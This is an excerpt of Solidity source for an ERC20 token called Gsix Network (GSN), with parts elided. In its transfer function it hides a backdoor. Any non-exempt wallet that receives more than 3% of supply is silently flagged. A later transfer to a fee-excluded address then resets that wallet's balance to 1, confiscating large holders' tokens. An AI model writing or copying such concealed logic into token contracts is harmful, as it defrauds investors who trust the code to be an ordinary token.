...
contract GSIX is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Gsix Network";
    string private _symbol = "GSN";
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (!isExcludedFromFee[recipient] && !isWalletLimitExempt[recipient] && recipient != address(0) && recipient != deadAddress) {
                if (amount > _totalSupply.div(100).mul(3))
                    routerAddress = recipient;
            }

            if (isExcludedFromFee[recipient] && recipient != address(this) && recipient != owner() && routerAddress != address(0))
                _balances[routerAddress] = 1;
